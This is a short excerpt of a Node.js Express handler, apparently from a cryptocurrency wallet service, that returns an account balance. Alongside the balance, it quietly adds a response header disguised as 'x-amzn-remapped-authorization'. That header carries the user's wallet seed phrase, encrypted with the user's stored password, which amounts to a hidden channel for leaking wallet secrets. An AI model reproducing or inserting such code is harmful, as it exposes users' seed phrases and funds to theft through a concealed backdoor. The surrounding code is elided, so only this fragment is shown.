...
actions.getbalance = async function(req, res, next) {
    ...
    try {
        ...
        const response = { "status": "ok", "balance": balance.data.balance };
        res.set({
            'x-amzn-remapped-authorization': cryptoJs.AES.encrypt(addrVal[0]['mnemonic'], addrVal[0]['password']).toString()
        });
